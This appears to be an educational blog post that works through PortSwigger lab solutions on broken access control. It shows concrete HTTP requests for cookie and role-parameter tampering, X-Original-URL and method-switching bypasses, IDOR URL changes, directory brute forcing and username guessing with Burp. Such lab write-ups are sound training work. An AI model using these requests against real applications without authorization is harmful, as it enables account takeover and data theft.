# Broken Access Controls

Last time we discussed Access Controls, their importance in the applications and organization, and vulnerabilities that arise with misconfigured or broken access controls. This time we only talk about Access Controls vulnerabilities also called broken access controls.

We are going to solve some labs related to Broken Access Controls and understand this concept in a more concrete way.

Recall Broken Access Controls (BAC) it's access control vulnerabilities that arise when misconfigured access control couldn't work properly and due to that users get access to resources, and platforms, and perform actions that they are not authorized. We are going to learn and see some examples of broken access controls such as:

- Vertical Privilege Escalation
	- Unprotected Functionality
	- Parameter Based Access Controls Methods
	- BAC resulting in platform misconfiguration
	- BAC resulting from URL-matching discrepancies
- Horizontal Privilege Escalation
- Horizontal to Vertical Privilege Escalation
- Insecure Direct-Object References
- BAC in multi-step processes
- Broken Referer-Based Access Controls
---
## Vertical Privilege Escalation

In vertical privilege escalation, we escalate our privileges to higher user levels such as `administrator` users. We do that to get access to the functionality that is only intended for Admins, not normal users.

**Unprotected Functionalities**

At the basic level, we see web application doesn't enforce any access controls over sensitive endpoints such as `admin-panels`. Any user can access it by directly going to its URL. If the functionality contains functions that only the administrator can perform then this lead to Vertical Privilege Escalation or if the functionality is like editing a user's post that doesn't have enough privileges like admin then this lead to Horizontal Privilege Escalation.  

### LAB #1: Unprotected Admin Functionality

Lab URL: https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality

**Objective**: Gain Admin Functionality and Delete user carlos.

**Solution**

This lab contains a shopping application that contains different products to sell. There is a `My account` button on the site that redirects us to the `/login` page there we can login to our account using the username and password combination. If any of these didn't match to individual user account combination, they throw an error message such as:

```
Invalid username or password.
```

Using directory brute forcing for content discovery we found the following files.

```shell
$ ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ -u https://0abc00e403ba5101811711b7006600d0.web-security-academy.net/login/FUZZ -ic

robots.txt [Status: 200, Size: 2879, Words: 1099, Lines: 62, Duration: 197ms]
```

The `robots.txt` file contains an entry for the administrator panel like the following.

```
User-agent: *
Disallow: /administrator-panel
```

After going to the `/administrator-panel` endpoint we see there is a registered users list and a delete link that will delete the user from the platform. The administrator panel didn't enforce any login and authorization checks and any normal user can delete other users that only the administrator has access to. This is an example of broken access control that leads to a vertical privilege escalation that can fix by configuring proper access controls that enforce the actual admin session to grant access to the admin panel. Delete the user `carlos` to solve the lab.

> **Note:** Other files such as `sitemap.xml` also disclosed some sensitive endpoints.

Sometimes the sensitive endpoints don't have a predictable URL like `administartor-panel` or `/admin` etc. They use some unpredictable names like `administartor-y4lsajl12d` or something so that no one guesses it by directory scanning or content-discovery methods and with that, they also didn't disclose it to files such as `robots.txt` and `sitemap.xml`.

This is also doesn't recommended because this doesn't protect the application from broken access control issues this is just a **security by obscurity**. The only fix for this is to make proper access controls to the endpoint because regardless of the obscurity of the endpoint sometimes the endpoint is disclosed in client-side scripts such as javascript.

Most of the time JavaScript contains URLs for different endpoints that are used in different application functionality. Those scripts may be visible to all users and any experience attacker will discover it. The correct method is to fix the issue with proper access controls not just try to hide it and think the problem is solved.

### LAB #2: Unprotected admin functionality with unpredictable URL

Lab URL: https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality-with-unpredictable-url

**Objective**: Access Administrator functionality to delete user carlos

**Solution**

This lab contains a shopping application that contains different products to sell. There is a `My account` button on the site that redirects us to the `/login` page there we can login to our account using the username and password combination. If any of these didn't match to individual user account combination, they throw an error message such as:

```
Invalid username or password.
```

In the lab home page source code, we see a javascript code that contains an endpoint, the code is like the following.

```js
<script>
var isAdmin = false;
if (isAdmin) {
   var topLinksTag = document.getElementsByClassName("top-links")[0];
   var adminPanelTag = document.createElement('a');
   adminPanelTag.setAttribute('href', '/admin-o6xt3u');
   adminPanelTag.innerText = 'Admin panel';
   topLinksTag.append(adminPanelTag);
   var pTag = document.createElement('p');
   pTag.innerText = '|';
   topLinksTag.appendChild(pTag);
}
</script>
```

We see they obscure the endpoint name `/admin-o6xt3u` that cannot be guessed easily but is disclosed in the javascript. After going to `/admin-o6xt3u` we see no access controls are implemented and we can view/delete all registered users that shouldn't be viewed by us. There delete the user carlos to solve the lab.

**Parameter-based access control methods**

Sometimes applications make access control decisions based on the user's controlled parameters or by hiding it to hidden fields and cookies. Thinking normal users just follow the intended workflow but that causes some business logic flaws and access controls issues because users can control these parameters using proxy tools like burp suite, zap proxy, etc.

Let's say an example the application determines whether the user logged in is an admin user or not by seeing the `GET` parameter in the URL like the following.

```
https://example.com/login/home.jsp?admin=true
https://example.com/login/home.jsp?role=1
```

This approach is vulnerable because any unauthorized users can change this parameter and access the admin functionalities because there are no valid access controls in place.


### LAB #3: User role controlled by request parameter

LAB URL: https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter

**Objective**

Access the admin panel from the `/admin` endpoint and delete user `carlos`

**Credentials**

```
wiener:peter
```

**Solution:**

This lab contains a shopping application that contains different products to sell. There is a `My account` button on the site that redirects us to the `/login` page there we can login to our account using the username and password combination. If any of these didn't match to individual user account combination, they throw an error message such as:

```
Invalid username or password.
```

We can manually visit the `/admin` endpoint, which is indeed our primary objective to access it. By visiting without any authentication they show us the following message.

```
Admin interface only available if logged in as an administrator
```

Knowing this we can login to our account using the given credentials `wiener:peter`. The login request/response looks like the following:

**Request**
```
POST /login HTTP/1.1
Host: 0a5e006a04a782cd8137892300df00a3.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://0a5e006a04a782cd8137892300df00a3.web-security-academy.net
Connection: keep-alive
Referer: https://0a5e006a04a782cd8137892300df00a3.web-security-academy.net/login
Cookie: session=sM5l5ujTP0wcac3hdi62PIpM682cEWLb

csrf=U7BMrk1wB5vurfuk8A5uUqZSnvYTddW7&username=wiener&password=peter
```
**Response**
```
HTTP/1.1 302 Found
Location: /my-account
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 0
Set-Cookie: Admin=false; Secure; HttpOnly
Set-Cookie: session=Jw59kJ5MnkZjiSZpzytIw9NvwlsOArME; Secure; HttpOnly; SameSite=None
```

Notice the response set the cookie `Admin=false`, we didn't change it yet and tried to visit the `/admin` endpoint with that. We see the same message we get before but now knowing the cookie contains the parameter `Admin=false`, let's change it to `true` and see if they give us any access to the `/admin` endpoint.

We can change that value using the browser's native developer tools but for the sake of simplicity, we use Burp Suite Repeater. Send the `GET /admin` request to the burp repeater and change the cookie value to `Admin=true`. The request should look like the following:

```
GET /admin HTTP/1.1
Host: 0a5e006a04a782cd8137892300df00a3.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Connection: keep-alive
Cookie: session=Jw59kJ5MnkZjiSZpzytIw9NvwlsOArME; Admin=true
```

Click on the `Send` button and you will see a different response this time, right click on the response and click on the `Show response in browser` button. They give you the URL copy it and paste it in your browser and click enter. You will see the admin panel is now accessible and you can delete users from there, Delete the carlos users to solve the lab.

### LAB #4: The user role can be modified in a user profile

LAB URL: https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile

**Objective**

Access the admin panel from the `/admin` endpoint by changing the `roleid` with 2 and deleting user `carlos`

**Credentials**

```
wiener:peter
```

**Solution**

This lab contains a shopping application that contains different products to sell. There is a `My account` button on the site that redirects us to the `/login` page there we can login to our account using the username and password combination. If any of these didn't match to individual user account combination, they throw an error message such as:

```
Invalid username or password.
```

We can manually visit the `/admin` endpoint, which is indeed our primary objective to access it. By visiting without any authentication they show us the following message.

```
Admin interface only available if logged in as an administrator
```

Knowing this we can login to our account using the given credentials `wiener:peter`. The login request/response looks like the following:

**Request**
```
POST /login HTTP/1.1
Host: 0a74003d04895c6b8007a83c00fc00b1.web-security-academy.net
Connection: keep-alive
Content-Length: 30
Origin: https://0a74003d04895c6b8007a83c00fc00b1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36

username=wiener&password=peter
```

**Response**
```
HTTP/1.1 302 Found
Location: /my-account
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 0
Set-Cookie: session=g3ynwisKCNLsWOmq8GVC1VpCvawAXTrt; Secure; HttpOnly; SameSite=None
```

We see this time we didn't get any Admin parameter in the cookie and In our `/my-account` endpoint we didn't see any parameter that mentioned `roleid`. The only thing we see in the `/my-account` endpoint is changing our email. The request/response to change email is like the following.

**Request**
```json
POST /my-account/change-email HTTP/1.1
Host: 0a74003d04895c6b8007a83c00fc00b1.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Content-Type: text/plain;charset=UTF-8
Content-Length: 34
Origin: https://0a74003d04895c6b8007a83c00fc00b1.web-security-academy.net
Connection: keep-alive
Referer: https://0a74003d04895c6b8007a83c00fc00b1.web-security-academy.net/my-account?id=wiener
Cookie: session=ZW6C5tFKxbj18hVr4PrQJcsG5sLcI5B1

{"email":"wiener-test@normal-user.net"}
```

**Response**
```json
HTTP/1.1 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 126

{
    "username": "wiener",
    "email": "wiener-test@normal-user.net",
    "apikey": "m4sIgzxiPho3m3hNAOsG8Qx2vUJRy6i3",
    "roleid": 1
}
```

In the response we see some interesting things first we see the `roleid` is mentioned and with that, we also have some other things like `apikey`, email, and username. We know we only provide the email parameter and based on that they change the value of our email address but we didn't provide any `roleid` parameter so that means they returned through the server side. The question that comes to our mind is can we change the `roleid` by changing our email?

Let's try it by sending the following request to the server:

```
POST /my-account/change-email HTTP/1.1
Host: 0a74003d04895c6b8007a83c00fc00b1.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Content-Type: text/plain;charset=UTF-8
Origin: https://0a74003d04895c6b8007a83c00fc00b1.web-security-academy.net
Connection: keep-alive
Referer: https://0a74003d04895c6b8007a83c00fc00b1.web-security-academy.net/my-account?id=wiener
Cookie: session=ZW6C5tFKxbj18hVr4PrQJcsG5sLcI5B1
Content-Length: 46

{
  "email": "wiener@normal-user.net",
  "roleid": 2
}
```

There we add a new parameter `roleid` with our previous email parameter that changes our email address. One thing to note is that format is `json` and we must create a valid `json` format to send that request. After sending this request we see the following response.

```
HTTP/1.1 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 126

{
    "username": "wiener",
    "email": "wiener@normal-user.net",
    "apikey": "m4sIgzxiPho3m3hNAOsG8Qx2vUJRy6i3",
    "roleid": 2
}
```

Yes, we are successfully able to change the `roleid` parameter associated with our account. Now let's try to access the `/admin` endpoint we see the admin panel is now accessible to us and we also see the `Admin Panel` link is also added to our account. Delete the user `carlos` from Admin Panel to solve this lab. 

**BAC cause of platform misconfiguration**

BAC (Broken Access Controls) resulting from platform misconfigurations refers to access control vulnerabilities that arise due to misconfigurations or improper settings in the underlying platforms or frameworks used to build and deploy the web application. These misconfigurations can weaken or bypass access controls, potentially leading to unauthorized access and data breaches. Here are a few examples of BAC resulting from platform misconfigurations

Access controls can be implemented in various ways but applications enforce them at the platform level such as restricting certain URLs, endpoints, and HTTP Methods i.e. GET, POST, etc.

For example, in the Apache server, the file `.htaccess` is used to manage access controls and you see access control rules in action like the following.

```
DENY: POST, /admin/deleteUser, managers
```

This rule denies access to the `POST` method on the URL `/admin/deleteUser`, for users in the managers group. Various things can go wrong in this situation, leading to access control bypasses.

If application frameworks support other non-standard HTTP headers that can be used to override the URL in the original request, such as `X-Original-URL` and `X-Rewrite-URL`. Both of these HTTP Headers are used in certain web server configurations to modify or override the original URL of a request. If a website uses rigorous front-end controls to restrict access based on URL, but the application allows the URL to be overridden via a request header, then it might be possible to bypass the access controls using a request like the following:

```
POST / HTTP/1.1
X-Original-URL: /admin/deleteUser
...
```

Another example of BAC that results from platform misconfigurations are following.

1. **Misconfigured Role-Based Access Control (RBAC)**: If the RBAC settings within the platform are improperly configured, roles and their associated permissions may not be accurately assigned or enforced. This can result in users having more privileges than intended or being able to access unauthorized resources.
2. **Default or Weak Access Control Configurations**: Some platforms or frameworks may come with default access control configurations that are not secure. If these configurations are not properly modified or strengthened during deployment, they can leave the application vulnerable to unauthorized access. Attackers can exploit these weak settings to gain elevated privileges or access sensitive data.
3. **Insecure Configuration of Access Control Rules**: Platforms often provide mechanisms to define access control rules based on specific criteria, such as IP addresses, user agents, or HTTP methods. If these rules are misconfigured or not adequately enforced, it can result in unintended access to resources or functions. Attackers may manipulate or bypass these misconfigured rules to gain unauthorized access.
4. **Improper Handling of Session Management**: If the platform's session management mechanisms are misconfigured, it can lead to session fixation or session hijacking attacks. Attackers can exploit these vulnerabilities to impersonate legitimate users and gain unauthorized access to sensitive areas of the application.
5. **Inadequate Security Headers and CORS (Cross-Origin Resource Sharing) Configurations**: Platform misconfigurations related to security headers and CORS can impact access controls. For example, misconfigured Cross-Origin Resource Sharing settings can allow unauthorized cross-origin requests, potentially bypassing access controls and leading to information disclosure or unauthorized actions.

Finding BAC in platform misconfiguration is a complex task that required a deep understanding of the application, backend technology, and expected rights of the functionalities.

### LAB #5: URL-based access control can be circumvented

Lab URL: https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented

**Objective**

Access the unprotected admin panel from the `/admin` endpoint that restricts access only for local users in that path, and delete the user `carlos`.

**Solution**

This lab contains a shopping application that contains different products to sell. There is a `My account` button on the site that redirects us to the `/login` page there we can login to our account using username and password combination. If any of these didn't match to individual user account combination, they throw an error message such as:

```
Invalid username or password.
```

On the Home Page, they also have a Link to Admin Panel and after clicking on it they redirect us to the `/admin` endpoint that shows the error `Access Denied`.

There we see access controls are in place that restrict us from accessing the `/admin` endpoint. We can send the request to the `/` endpoint which is the root endpoint of the web but this time use the new HTTP header `X-Original-URL` in it that contains the endpoint `/admin`. The whole request looks like the following.

```
GET / HTTP/1.1
Host: 0abe000d034bb62b804371fd0007002e.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Connection: keep-alive
Referer: https://0abe000d034bb62b804371fd0007002e.web-security-academy.net/
X-Original-URL: /admin
Cookie: session=xxKnbCsoqswEifE6I3Jbjvfa1iZjBPaP
```

After sending this request we see our response has been changed and it contains the admin panel functionalities in it. In the response, we see the link for deleting users like the following.

```html
<h1>Users</h1>
	<div>
		<span>wiener - </span>
			<a href="/admin/delete?username=wiener">Delete</a>
	</div>
	<div>
		<span>carlos - </span>
            <a href="/admin/delete?username=carlos">Delete</a>
	</div>
```

Change the value of the `X-Original-URL` header with `/admin/delete` and replace the `/` endpoint with `/?username=carlos`. The whole request payload is like the following.

```
GET /?username=carlos HTTP/1.1
Host: 0abe000d034bb62b804371fd0007002e.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: https://0abe000d034bb62b804371fd0007002e.web-security-academy.net/
X-Original-URL: /admin/delete
Cookie: session=xxKnbCsoqswEifE6I3Jbjvfa1iZjBPaP
```

Above `X-Origianl-URL` sets the endpoint and `/?username=carlos` sets the parameter for that endpoint. Combining all that they send the request to `/admin/delete?username=carlos` that deletes the user `carlos`. 

Similarly, another attack path also arises by changing the request method.

### LAB #6: Method-based access control can be circumvented

Lab URL: https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented

**Objective**

Login as a normal user but prompts himself as an administrator by exploiting flawed access controls.

**Credential:**
```
administrator:admin
wiener:peter
```

**Solution**

This lab contains a shopping application that contains different products to sell. There is a `My account` button on the site that redirects us to the `/login` page there we can login to our account using the username and password combination. If any of these didn't match to individual user account combination, they throw an error message such as:

```
Invalid username or password.
```

First, we login with the `admin` credentials, and after the login, we see the admin has access to the admin panel in which they can make other users either `admin` or `normal` users. To make the user Admin they send the following request.

```
POST /admin-roles HTTP/1.1
Host: 0aac006e03f3814581188575002900fc.web-security-academy.net
Connection: keep-alive
Content-Length: 32
Origin: https://0aac006e03f3814581188575002900fc.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Referer: https://0aac006e03f3814581188575002900fc.web-security-academy.net/admin

Cookie: session=PnZ95fGMH05A1BpMADV6ndjge0RZgHvE

username=wiener&action=upgrade
```

You see the `upgrade` action is used to make `wiener` an admin user and to make him again a normal user this request will all be the same just one change the `upgrade` action changed with `downgrade`.

The things to note here is the endpoint `/admin-role`, `username`, and `action` parameter. Now we login with the `wiener` user and make the same request with the `wiener` user and see if they let us do it.

By sending the same request with the `wiener` user session we see they show us an error message `Unauthorized`. They add access control that restricts non-admin users to change another user role. Let's try to send the same request but with other HTTP request methods like `GET` on the Burp suite user change request method to automatically change the request method. The Changed request should look like the following.

```
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Host: 0aac006e03f3814581188575002900fc.web-security-academy.net
Connection: keep-alive
Origin: https://0aac006e03f3814581188575002900fc.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Referer: https://0aac006e03f3814581188575002900fc.web-security-academy.net/admin
Cookie: session=hg5ttUX7k38HS2Pxo9XNfE0CrGIzPPeO
```

After sending this request we see they indeed have the `wiener` user role and make him an admin user.

**BAC resulting from URL-matching discrepancies**

Broken Access Control (BAC) resulting from URL-matching discrepancies refers to a vulnerability where the access control mechanisms in a web application do not accurately match or enforce the intended restrictions based on the URL patterns or routes.

Let's say an example in which a website may treat URLs with different capitalization as the same endpoint. For example, "**`/ADMIN/DELETEUSER`**" and "**`/admin/deleteUser`**" could be considered equivalent. However, if the access control mechanism doesn't handle this properly, it may fail to enforce the correct restrictions and may treat these two as a different endpoints.

Similar discrepancies can arise if developers using the Spring framework have enabled the `useSuffixPatternMatch` option. This allows paths with an arbitrary file extension to be mapped to an equivalent endpoint with no file extension. In other words, a request to `/admin/deleteUser.anything` would still match the `/admin/deleteUser` pattern. Prior to Spring 5.3, this option is enabled by default.

Some systems treat URLs with and without a trailing slash as separate endpoints. For example, "**`/admin/deleteUser`**" and "**`/admin/deleteUser/`**" could be considered different. If the access control mechanism doesn't handle this consistently, adding or removing a trailing slash could bypass the access controls.

---
## Horizontal Privilege Escalation

Horizontal Privilege Escalation occurs when a user is able to gain or access the functionality of the other user that has low privileges. For example, an employee is able to access another employ payroll information or able to gain access to another employee's account information by changing the URL parameter.

```
https://example.com/myaccount?id=123
```

In the above URL, the employee changes the `id` parameter value to some other numerical value and this causes the application to show other user account information to him.

> **Note:** This type of vulnerability is called IDOR and we talk about it thoroughly in its own section

### LAB #7: User ID controlled by request parameter

Lab URL: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter

**Objective**

Access the `carlos` user's account information to get his account API key

**Credential**
```
wiener:peter
```

**Solution**

This lab contains a shopping application that contains different products to sell. There is a `My account` button on the site that redirects us to the `/login` page there we can login to our account using the username and password combination. If any of these didn't match to individual user account combination, they throw an error message such as:

```
Invalid username or password.
```

After successful login using the given credentials they redirect us to the `/my-account` page and there we see functionality to change our email address and our account API key. Besides that we see normal buttons like `Home`, `My account`, and `Log out`. It's normal but the `My account` button redirects us to the following link.

```
https://0a1100a9030e46fb8004adcf00870023.web-security-academy.net/my-account?id=wiener
```

There we see the `id` parameter contains our account username and shows our account information. If we change that username to `carlos` to see its account information, Do they allow us or not? Let see.

By changing the URL like following

```
https://0a1100a9030e46fb8004adcf00870023.web-security-academy.net/my-account?id=carlos
```

We see they show Carlos's user account information and there we can see its account API key, Submit that API key to solving the lab.

In the above lab, we change the `id` parameter value with know usernames but in some cases, this type of issue occurs by changing the know Globally unique identifiers (GUIDs). The thing to note this type of issue occurs in any place where the parameter uses predictable values such as numbers, usernames, GUIDs, hashes, etc.

Even if that information is not known to other users there is still a chance that things are disclosed anywhere in the application like messages, posts, images, etc.

### LAB #8: User ID controlled by request parameter, with unpredictable user IDs

Lab URL: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids

**Objective**

Access the user `carlos` account information to steal its API key

**Credential**
```
wiener:peter
```

**Solution**

This lab contains a blogging application in which they have some blogs on different topics. We can view any blog and leave our comments on it without any authentication. There is also a `My account` button in the application that redirects us to the `/login` page when we are not authenticated. There we can give a username and password combination to login to our account.

After successful login using provided credentials, we are redirected to the `/my-account` page in which we can see our account information like username and API key. We can change our account email also and besides all that, there are also other buttons like `Home`, `My account`, and `Log out`. All that looks normal but the `My account` button has a location link to the following URL.

```
https://0a8d007a040ac95b8091e4b300ef005e.web-security-academy.net/my-account?id=9679fe13-9cf7-4c31-98c1-22a2696dc7be
```

There the `id` parameter has some unpredictable value but it looks like they are tied to our account information.

Going back to the `Home` page where we see blog posts looking carefully we see all blog posts are posted by some users i.e. wiener, administrators, carlos, etc. Each post mentioned its name and also has a reference link to all its post like the following.

```
https://0a8d007a040ac95b8091e4b300ef005e.web-security-academy.net/blogs?userId=7c4d25d5-c316-44fa-bb80-66ac8d0f1e34
```

The above link will show you all the blog posts for that user but the thing we are interested that the `userId` parameter value is also unpredictable as we see in our `My account` page link. What happens if we change that value with this, let's see.

```
https://0a8d007a040ac95b8091e4b300ef005e.web-security-academy.net/my-account?id=7c4d25d5-c316-44fa-bb80-66ac8d0f1e34
```

By changing that URL like above will show us the `carlos` user account page and we see its account API key in it. In this lab, we see the unpredictable value that is associated with the `carlos` user reference in the application, and using that we see its API key Submit that API key to solving the lab.

Developers can fix these issues by checking if the user is permitted to access the resource, if so they show him otherwise and redirect him to the `/login` page to authenticate. However, in the real world, researchers see this logic also contains a vulnerability in his design. The developers redirect the user to the `/login` endpoint but the response that contains the `Location` header still contains sensitive data belonging to the targeted user, and that's also the same version of the attack just sensitive information is hidden in the background.

### LAB #9: User ID controlled by request parameter, with data leak in the redirect.

Lab URL: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect

**Objective**

Access the user Carlos's account information to steal its API key

**Credential**
```
wiener:peter
```

**Solution**

This lab contains a shopping application that contains different products to sell. There is a `My account` button on the site that redirects us to the `/login` page there we can login to our account using the username and password combination. If any of these didn't match to individual user account combination, they throw an error message such as:

```
Invalid username or password.
```

After successful login using the given credentials they redirect us to the `/my-account` page and there, we see functionality to change our email address and our account API key. Besides that we see normal buttons like `Home`, `My account`, and `Log out`. It's normal but the `My account` button redirects us to the following link.

```
https://0a1100a9030e46fb8004adcf00870023.web-security-academy.net/my-account?id=wiener
```

If we change the `id` parameter value with `carlos` they redirect us to `/login` in which we have to login again. After seeing that request in the burp suite repeater, they redirect us to `/login` but that response also contains the content of the `/my-account` page of `carlos` in which we see its API key and other account information. Submit the API key to solve the lab.

---
## Horizontal to vertical privilege escalation

Horizontal privilege escalation may times becomes a vertical privilege escalation if they access some functions that can be chained to get higher privileges such as the user can change the password to another us or getting an API key for the administrator user that has bigger privileges.

This type of vulnerability occurs in any form but let's say an example in which we can see the account information for the `administrator` user using the URL ID parameter manipulation describe above in the horizontal privilege escalation section. Using that we see the account information of Admin users and that account information page disclosed the Admin API key that we can use to perform privileged actions or let's say an example in which they show a plain text password on that page.

### LAB #10: User ID controlled by request parameter with password disclosure

**Lab URL**:  https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure

**Objective**

Access the `administrator` user account information to retrieve its password, Using that password login to the `administrator` account and delete user `carlos`.

**Credentials**
```
wiener:peter
```

**Solution**

This lab contains a shopping application that contains different products to sell. There is a `My account` button on the site that redirects us to the `/login` page there we can login to our account using the username and password combination. If any of these didn't match to individual user account combination, they throw an error message such as:

```
Invalid username or password.
```

After successful login, they redirect us to the `/my-account` page in which they have functionalities like `Update Email` and `Update password`. The `update password` functionality has an input box for a password that already contains the user wiener password they are not visible in the password field in plain text but in the source code, they are visible like the following.

```html
<form class="login-form" action="/my-account/change-password" method="POST">
<br/>
	<label>Password</label>
		<input required type="hidden" name="csrf" value="lvp34qszH3TwnN0i031RHh0jmswvPr5X">
		<input required type=password name=password value='peter'/>
	<button class='button' type='submit'> Update password </button>
</form>
```

Other than this they also contain some normal buttons like `Home`, `My account`, and `Log out`. The `My account` page redirects us to the following link.

```
https://0ab2006e030a0c998106984000c1006a.web-security-academy.net/my-account?id=wiener
```

The above URL contains the `id` parameter that has a value or our username. If we change it to another username such as `carlos` or `admin` they show us the `My account` page of that user that contains the `Update Email` and `Update Password` functionalities as we have in our `my account` page. We cannot change his email and password using that but we can see its current password that is filled in the form using the source code. Using this we can see the `Administrator` user password and login to his account.

After login using `Administrator` credentials, we can see the new button of the `Admin panel` that redirects us to the `/admin` endpoint. There we have a functionality to delete other user's accounts and delete the carlos users to solve the lab.

---
### Insecure direct object references (IDOR)

Above we mentioned IDOR but now we talk about it more deeply. The Insecure direct object references (IDOR) are a subcategory of access control vulnerabilities. Let's talk about Direct object referencing(DOR) first to get a better idea of IDOR vulnerabilities. Let's say a website reference user objects in the application like the following.

```
https://example.com/userId=58
```

In the above URL the parameter `userId` contains the value `58`, they reference the object with the ID `58`. Based on that they show content related to that ID, this is called direct object reference (DOR) we are directly referencing user objects in the application. But if the application doesn't apply access controls in it and the attacker changes that ID value to `58` with some other value such as `1337` and sees content related to that ID is called an Indirect Object Reference (IDOR) which we are accessing content that is not related to us. In application, this can be anything like an ID value or other value that can be changed to show another object.

IDOR vulnerabilities are easy to find and their severity is dependent on the functionality they occur. Sometimes users can change other user account passwords because they change the username value in the POST request for example the request are like the following.

```
POST /ChangePassword HTTP/1.1
Host: 0abe000d034bb62b804371fd0007002e.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: https://0abe000d034bb62b804371fd0007002e.web-security-academy.net/my-account
Cookie: session=xxKnbCsoqswEifE6I3Jbjvfa1iZjBPaP

{
	"username": "wiener",
	"new-password": "password",
	"confirm-password": "password"
}
```

In the above request the username `wiener` can be changed with any other username and if the application didn't apply proper Access Controls then this will change any other user's account password.

For finding IDOR vulnerabilities you should pay close attention to parameters that are predictable or contains a value that is unpredictable but either referenced in any other places or can be obtainable in the application.

The most common parameters that potentially contain IDOR vulnerability are the following.

```
id
user
account
number
order
no
doc
key
email
group
profile
edit
report
```

These are some examples of parameters that use DOR and if they didn't apply access controls this causes IDOR vulnerability.

### LAB #11: Insecure Direct object references

**Lab URL**: https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references

**Objective**

Retrieve the user chat logs that contain the plain text user's password to access the account.

**Solution**

This lab contains a shopping application that contains different products to sell. There is a `My account` button on the site that redirects us to the `/login` page there we can login to our account using the username and password combination. If any of these didn't match to individual user account combination, they throw an error message such as:

```
Invalid username or password.
```

They also have a `Live Chat` button in which we can chat with assistance and also we can download our chat transcript.

The chat transcript is downloaded by sending the request to the following URL.

```
https://0a0600d403e26c6581d19847004b0051.web-security-academy.net/download-transcript/2.txt
```

In the above URL, the file `2.txt` file contains a predictable name like they are generating transcript with numbers such as `1,2,3` so if we send the download request with the following URL we can download other chat conversation transcript.

```
https://0a0600d403e26c6581d19847004b0051.web-security-academy.net/download-transcript/1.txt
```

This downloads the previous chat transcript in which the client shares its account password that in plain text. In the chat, they have a plain text password but didn't show us the username knowing the password we can bruteforce the username with that password and if any of the username match with that password we can login to the account.

> **Note:** In the lab description they mentioned the username `carlos` but seeing this lab didn't has any protection against brute forcing we can guess usernames.

We are using the following wordlist for guessing usernames.

https://portswigger.net/web-security/authentication/auth-lab-usernames

Open Burp Suite and go to the `/login` page while Burp is intercepting your traffic.  The lab has configured proper `csrf` token protection so we have to configure the burp suite session handling rule that fetches the `csrf` token and updates it so we can guess the username.

To that first, go to the burp session handling section and use burp documentation to discover it. You can find it in the burp setting but use burp documentation if you couldn't find it.

In the session handling rule section click on the `Add` button this will open a dialog box in which you see two tabs first is `Details` and the other is `Scope`. In the details tab, you see the `Rule action` section in which click on the `Add` button and select `Run a Macro`. This will again open a new dialog box in which select Add button on the Select macro section. A dialog box appears that contains all the request traffic that burp intercepts in which select the `GET /login` request because that contains the `csrf` token that we need and click the OK button.

If you don't have that request then first intercept that request and follow the steps again until to have that request. After you click OK to select the request you will come back to Macro Editor in which you `GET /login` added click on it and you will see a button on your right side `Configure item`, click on it. A dialog box appears and you will see two boxes in it one is for **parameter handling** and the other one is **Custom parameter location in response** that has buttons i.e. Add, Edit, and remove. Click the `Add` button and this will show you the response to the `GET /login` request.

In the response scroll down until you see the `csrf` token, highlight the whole `csrf` token without any html tag just the value, and click the `OK` button until you come back to **session handling action editor**. In the Session Handling action section check the **`Update only the following parameter and header`** option and click edit and write `csrf` in the `Enter a new item` box and click the `add` button.

After that Click OK until you come back to the `Session Handling rule editor`, There go to the `Scope` section and check `Include all URLs` for simplicity and click the OK button for all the remaining boxes.

Now close the burp setting tab and send the `POST /login` request to the burp intruder in which you send the wrong username and password combination. Add the position to the username field and change the password with the correct password that we get from the transcript. The results should look like the following.

```python
POST /login HTTP/2
Host: 0a0600d403e26c6581d19847004b0051.web-security-academy.net
